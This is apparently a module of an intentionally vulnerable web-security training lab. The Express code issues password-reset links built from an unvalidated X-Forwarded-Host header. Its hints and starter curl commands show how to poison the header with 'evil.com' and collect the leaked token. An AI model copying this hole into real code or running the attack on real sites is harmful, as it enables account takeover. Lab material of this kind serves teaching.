'use strict';
// Forwarded-Host Header Poisoning: POST /hostheader/forgot-xfwd builds the
// emailed reset link from X-Forwarded-Host (falling back to X-Host-Override,
// then Host). A poisoned proxy header makes the victim's token point at the
// attacker's collector (GET /hostheader/evil-collect).
const express = require('express');
const crypto = require('crypto');
const { esc, page } = require('../../../lib/page');
// Module-level helper (lives in modules/hostheader/shared.js, placed by the
// module finisher; not copied here): tokenDb() ensures the hostheader_tokens
// table exists and returns the db handle. The /reset and /evil-collect routes
// that consume these tokens also live in the finisher's index.js/shared.js.
// Module-level middleware (placed in the finisher's index.js):
// express.urlencoded({ extended: false }) so POST /forgot-xfwd sees req.body.
const { tokenDb } = require('../shared');

const router = express.Router();

const APP = 'Nimbus Member Portal';

function shell(crumb, bodyHtml) {
  return `<section class="clay-card">
    <div class="card-top"><span class="orb" aria-hidden="true">N</span><b>${esc(APP)}</b><span class="dim">${esc(crumb)}</span></div>
    ${bodyHtml}
  </section>`;
}

function navRow(links) {
  const all = (links || []).concat([['/hostheader', 'Module index']]);
  return `<p>${all.map(([href, label]) =>
    `<a class="clay-btn clay-btn-secondary clay-btn-sm" href="${esc(href)}">${esc(label)}</a>`).join(' ')}</p>`;
}

// GET /forgot-xfwd -> password reset request form. This instance of the portal
// sits behind a proxy, so it reads the forwarded-host headers instead of Host.
router.get('/forgot-xfwd', (req, res) => {
  res.send(page('Forgot password', `
    ${shell('Account recovery', `
      <h2>Forgot your password?</h2>
      <p>Enter your email and we will send a reset link.</p>
      <form method="POST" action="/hostheader/forgot-xfwd">
        <div class="clay-field">
          <label for="email">Email address</label>
          <input class="clay-input" type="email" id="email" name="email"
            placeholder="alice@pentrix.lab" required />
        </div>
        <button class="clay-btn clay-btn-primary" type="submit">Send reset link</button>
      </form>
      <p class="note dim">The reset link is built from the
      <code>X-Forwarded-Host / X-Host-Override</code> request header. The "sent"
      email is shown on the next page so you can play both attacker and victim.</p>
    `)}
    ${navRow([])}
  `));
});

// POST /forgot-xfwd -> issue a one-time token and show the "sent" email (lab view).
router.post('/forgot-xfwd', (req, res) => {
  const email = String(req.body.email || '').slice(0, 120);
  if (!email.includes('@')) {
    return res.status(400).send(page('Forgot password', `
      ${shell('Account recovery', `
        <p>A valid email address is required.</p>
      `)}
      ${navRow([['/hostheader/forgot-xfwd', 'Back']])}
    `));
  }
  // VULN: the password-reset link is built from an untrusted proxy header
  // (X-Forwarded-Host, then X-Host-Override, then Host) with no validation.
  const host = String(req.headers['x-forwarded-host'] || req.headers['x-host-override'] || req.headers.host || '');
  const token = crypto.randomBytes(16).toString('hex');
  tokenDb()
    .prepare('INSERT INTO hostheader_tokens (token, email, issued_host, vuln) VALUES (?,?,?,?)')
    .run(token, email, host, 'host-xforwarded');
  const link = 'http://' + host + '/hostheader/reset?token=' + token;
  res.send(page('Reset link sent', `
    ${shell('Account recovery', `
      <h2>Email sent (lab view)</h2>
      <p>In a real app this would be emailed. The lab shows it so you can play
      both attacker and victim:</p>
      <div class="clay-well">
        <p>Hi ${esc(email)},</p>
        <p>Reset your password here:<br /><a href="${esc(link)}">${esc(link)}</a></p>
      </div>
      <p class="note dim">Poison the <code>X-Forwarded-Host / X-Host-Override</code>
      header and the link above points at the attacker's domain while carrying a
      valid token. When the victim "clicks" it, the token lands in the attacker's
      collector at <code>/hostheader/evil-collect?token=...</code>.</p>
      <p>
        <a class="clay-btn clay-btn-secondary clay-btn-sm" href="/hostheader/forgot-xfwd">Send another</a>
      </p>
    `)}
    ${navRow([])}
  `));
});

const vuln = {
  id: 'host-xforwarded',
  name: 'Forwarded-Host Header Poisoning',
  difficulty: 'Easy',
  hint: 'Behind a proxy, this reset page trusts X-Forwarded-Host (and the vendor-specific X-Host-Override) over Host. Same attack, different headers.',
  hints: ["Behind a proxy, the app trusts X-Forwarded-Host. Can you set that header?", "Yes. X-Forwarded-Host: evil.com (or X-Host-Override: evil.com) poisons the reset link.", "POST /hostheader/forgot-xfwd with X-Forwarded-Host: evil.com."],
  tools: 'C',
  how: 'POST /hostheader/forgot-xfwd with X-Forwarded-Host: evil.com (or X-Host-Override: evil.com), then bring the token to the collector.',
  link: '/hostheader#host-xforwarded',
  start: 'curl -s -X POST -H "X-Forwarded-Host: evil.com" --data "email=alice@pentrix.lab" http://localhost:3000/hostheader/forgot-xfwd\ncurl -s "http://localhost:3000/hostheader/evil-collect?token=TOKEN_FROM_EMAIL"',
};

module.exports = { vuln, router };
